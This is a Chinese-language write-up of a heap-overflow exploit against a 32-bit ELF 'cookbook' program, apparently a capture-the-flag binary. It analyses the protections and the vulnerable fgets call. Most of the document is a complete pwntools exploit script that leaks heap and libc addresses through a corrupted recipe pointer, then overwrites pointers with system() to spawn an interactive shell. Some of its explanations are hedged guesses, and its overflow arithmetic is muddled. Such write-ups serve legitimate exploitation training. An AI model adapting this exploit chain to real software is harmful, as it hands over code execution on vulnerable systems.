# 漏洞利用文档

## 执行环境
- **二进制程序**: 32位ELF程序，使用动态链接的libc。通过`file`命令确认为ELF 32-bit LSB executable。地址空间固定（无PIE），GOT地址为0x0804d020。
- **保护机制**: 
  - 栈保护（Stack Canary）已启用，通过`__readgsdword(0x14u)`验证。
  - 部分RELRO，GOT可写。
  - 无PIE，代码段地址固定。
  - 堆栈不可执行（NX enabled）。
- **依赖**: 标准C库（libc），通过`ldd`可获取具体版本（如libc6-i386）。exp使用pwntools和LibcSearcher进行利用。
- **运行环境**: Linux系统，需安装python3、pwntools、gdb等工具。程序通过`./data/sample5`运行，exp在相同目录下执行。

## 漏洞成因
- **漏洞类型**: 堆溢出（Heap Overflow）。
- **漏洞位置**: 在函数`sub_8049092()`（食谱功能）中，当选择'g'（给食谱命名）或'i'（设置指令）时，执行`fgets((char *)dword_804D0A0 + 140, 1036, stdin);`。其中`dword_804D0A0`指向通过`calloc(1u, 0x40Cu)`分配的1036字节内存块。从偏移140开始写入最多1035字节加null终止符，而分配大小仅为1036字节，导致写入超出分配范围，溢出140字节（写入范围索引140-1174，最大有效索引1035）。
- **根本原因**: 程序未正确验证写入位置和大小，溢出可覆盖堆中相邻chunk的头部或数据，包括全局指针（如`curr_recipe`）或函数指针（如食谱结构中的`off_804D064`），最终导致任意代码执行。
- **关键结构体**: 
  - 食谱结构（大小0x40C）：包含食材列表指针、数量列表指针、名称（偏移8）、类型指针（偏移124）、指令（偏移140）等。
  - 食材结构（大小0x90）：包含卡路里、价格、名称（偏移8）等。
  - 全局变量：`dword_804D0A0`（当前食谱）、`dword_804D09c`（当前食材）、`dword_804D094`（食材列表）、`dword_804D08c`（食谱列表）。

## 漏洞利用过程
利用过程分为信息泄漏、堆布局/溢出和控制流劫持三个阶段，关键内存变化如下：

| 步骤 | 关键操作 | 堆内存变化 | 全局变量变化 | 描述 |
|------|----------|------------|-------------|------|
| 初始状态 | 程序启动 | 堆chunk正常链接，bins为空 | `curr_recipe`=NULL, `curr_ingr`=NULL | 程序初始化完成，堆布局稳定 |
| 步骤1-2 | 设置用户名，进入主菜单 | 无显著变化 | `dword_804D0ac`指向"MYNAME" | 为利用准备环境 |
| 步骤3 | `read_ptr(INGR_LIST)` | 通过溢出泄漏堆地址 | 无变化 | 泄漏食材列表指针，获取堆基地址 |
| 步骤4 | `read_ptr(FGETS_GOT)` | 通过溢出泄漏GOT地址 | 无变化 | 泄漏fgets的libc地址，计算system地址 |
| 步骤5 | `corrupt_curr_recipe_ptr` | 伪造chunk（0x87682b0），覆盖top chunk元数据 | `curr_recipe`指向伪造chunk | 利用溢出修改指针，指向恶意数据 |
| 最终 | 触发system("sh") | 堆部分污染，bins基本空 | 进程切换为`/bin/dash` | 控制流劫持成功，获得shell |

- **堆溢出利用**: exp通过食谱命名功能（`sub_8048B68`）触发溢出，覆盖`curr_recipe`指针，使其指向伪造的chunk。伪造chunk包含system地址和"sh"字符串，当程序操作食谱时（如移除食材），触发函数调用执行system("sh")。
- **调试记录验证**: 在Step 5中，内存显示`curr_recipe`被修改为0x87682b0，该地址包含伪造数据（如0x41414141），且最终进程变为`/bin/dash`，表明利用成功。

## Exploit
```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample5')
p = process('./data/sample5')
libc = elf.libc
system_off = libc.symbols['system']
fgets_off = libc.symbols['fgets']
RECIPE_LEN = 0x40c  # 食谱结构大小，1036字节
CURR_INGR = 0x0804d09c  # 当前食材全局变量地址
INGR_LIST = 0x0804d094  # 食材列表全局变量地址
FGETS_GOT = 0x0804d020  # fgets的GOT条目地址

def sl(l):
    p.sendline(l)

def main_menu():
    p.readuntil('[R]emove cookbook name\n[q]uit\n')

def recipe_menu():
    p.readuntil('[p]rint current recipe\n[q]uit\n')

def ingr_menu():
    p.readuntil("[q]uit (doesn't save)?\n[e]xport saving changes (doesn't quit)?\n")

def read_addr(addr):
    # 利用堆溢出读取任意地址的内容：通过食谱命名功能触发溢出，覆盖指针后泄漏数据
    sl('c')  # 进入食谱菜单
    recipe_menu()
    sl('n')  # 新建食谱，分配0x40C字节
    recipe_menu()
    sl('d')  # 丢弃食谱，释放内存
    recipe_menu()
    sl('q')  # 退出食谱菜单
    main_menu()
    sl('g')  # 给食谱书命名，触发堆溢出漏洞
    p.readuntil("(hex because you're both a chef and a hacker!) : ")
    sl('{:x}'.format(RECIPE_LEN))  # 指定分配大小0x40C
    # 构造payload：填充数据直到偏移140，然后覆盖指针以读取addr处的值
    # 偏移计算：从食谱基地址开始，覆盖到类型指针（偏移124）或指令区域（偏移140）
    sl(b'\x00'*8 + b'A'*(0x7c-8) + p32(addr))  # 0x7c=124，覆盖类型指针为目标地址
    p.readuntil('the new name of the cookbook is')
    main_menu()
    sl('c')  # 进入食谱菜单
    recipe_menu()
    sl('p')  # 打印食谱，泄漏类型指针处的数据
    p.readuntil('recipe type: ')
    leak = p.readuntil('total cost :')
    ret = leak[:-(len('total cost :')+2)]  # 提取泄漏的数据
    recipe_menu()
    sl('q')  # 退出
    main_menu()
    sl('R')  # 移除食谱书名称，清理内存
    main_menu()
    return ret

def read_ptr(addr):
    # 读取指针值：处理可能未对齐的读取，确保获取4字节数据
    data = b''
    while len(data) < 4:
        last_read = read_addr(addr)
        if len(last_read) == 0:
            data += b'\x00'
        else:
            data += last_read
    return u32(data[:4])

def corrupt_curr_recipe_ptr(ingr_list_ptr, system_addr):
    # 利用堆溢出修改当前食谱指针，最终执行system("sh")
    sl('a')  # 进入食材菜单
    ingr_menu()
    sl('n')  # 新建食材，分配0x90字节
    ingr_menu()
    sl('s')  # 设置卡路里
    sl('0')  # 输入0，可能用于初始化数据
    ingr_menu()
    sl('p')  # 设置价格
    sl('{}'.format(u32(p32(0x804cff8))))  # 输入特定值，可能用于堆布局
    ingr_menu()
    sl('q')  # 退出食材菜单
    main_menu()
    sl('c')  # 进入食谱菜单
    recipe_menu()
    sl('n')  # 新建食谱
    recipe_menu()
    sl('d')  # 丢弃食谱，可能释放内存以创建空洞
    recipe_menu()
    sl('q')  # 退出
    main_menu()
    sl('g')  # 给食谱书命名，触发溢出
    p.readuntil("(hex because you're both a chef and a hacker!) : ")
    sl('{:x}'.format(0x40c))  # 指定大小0x40C
    # 构造伪造的食谱结构：覆盖curr_recipe指针，使其指向恶意数据
    fake_recipe = p32(ingr_list_ptr) + p32(CURR_INGR-4)  # 使当前食谱指针指向食材列表附近
    sl(fake_recipe)
    p.readuntil('the new name of the cookbook is')
    main_menu()
    sl('c')  # 进入食谱菜单
    recipe_menu()
    sl('r')  # 移除食材，触发函数调用（可能通过覆盖的函数指针）
    p.readuntil('which ingredient to remove? ')
    sl('tomato\x00')  # 输入食材名，触发操作
    recipe_menu()
    sl('q')  # 退出
    main_menu()
    sl('a')  # 进入食材菜单
    ingr_menu()
    sl('g')  # 给食材命名，写入"sh"和system地址到内存
    sl(b'sh; \x00\x00\x00\x00' + p32(system_addr)*32)  # 注入shell命令和system地址，覆盖函数指针

# 主利用流程
p.readuntil(b'what\'s your name?\n');p.sendline(b'MYNAME')  # 步骤1: 设置用户名，初始化堆内存
main_menu()  # 步骤2: 进入主菜单，等待输入
ingr_list_ptr = read_ptr(INGR_LIST)  # 步骤3: 泄漏堆地址，用于计算偏移
fgets_addr = read_ptr(FGETS_GOT)  # 步骤4: 泄漏libc地址
libc_addr = fgets_addr - fgets_off  # 计算libc基地址
system_addr = libc_addr + system_off  # 计算system函数地址
corrupt_curr_recipe_ptr(ingr_list_ptr, system_addr)  # 步骤5: 利用溢出修改指针并触发shell
p.interactive()  # 步骤6: 进入交互模式，使用shell
```

### 注释说明
- **信息泄漏**: `read_addr`函数利用堆溢出覆盖食谱类型指针，然后通过打印功能泄漏任意地址内容。`read_ptr`确保读取完整的4字节指针。
- **地址计算**: 通过泄漏的GOT地址计算libc基地址和system地址，绕过ASLR。
- **控制流劫持**: `corrupt_curr_recipe_ptr`通过堆溢出修改`curr_recipe`指针，使其指向伪造的chunk。当程序操作食谱时（如移除食材），可能调用覆盖的函数指针（如`off_804D064`），执行system("sh")。
- **堆布局**: exp通过创建和释放食谱/食材，操纵堆布局，确保溢出覆盖关键指针。
- **成功条件**: 利用后进程切换为`/bin/dash`，获得完整shell控制权，如调试记录中Step 5所示。
